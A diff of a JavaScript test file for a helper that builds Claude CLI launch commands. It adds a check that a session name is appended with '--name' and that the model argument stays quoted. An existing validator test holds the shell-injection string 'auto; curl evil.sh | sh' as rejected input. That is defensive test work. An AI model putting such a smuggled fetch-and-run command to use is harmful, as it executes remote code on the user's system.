@@ -87,6 +87,15 @@ test('buildClaudeBase single-quotes the --model so glob metachars (haiku[1m]) do
   assert.equal(buildClaudeBase('acceptEdits', 'opus'), "claude --permission-mode acceptEdits --model 'opus'");
 });
 
+// t-2b89: the session name is what matches a slot to its `~/.claude/sessions/<pid>.json`, so it
+// must actually reach the spawn line — and the line must stay apostrophe-free outside the quoted
+// --model, since the whole command is re-quoted around the /loop prompt.
+test('buildClaudeBase appends --name when a session name is given', () => {
+  const line = buildClaudeBase('auto', 'opus[1m]', 'loopboard-opus');
+  assert.equal(line, "claude --permission-mode auto --model 'opus[1m]' --name loopboard-opus");
+  assert.ok(!buildClaudeBase('auto', 'opus').includes('--name'), 'omitted when no name is given');
+});
+
 test('isValidPermissionMode: accepts every package.json enum value, rejects anything else', () => {
   for (const m of PERMISSION_MODES) assert.ok(isValidPermissionMode(m), `${m} is valid`);
   assert.ok(!isValidPermissionMode('auto; curl evil.sh | sh'), 'shell injection rejected');
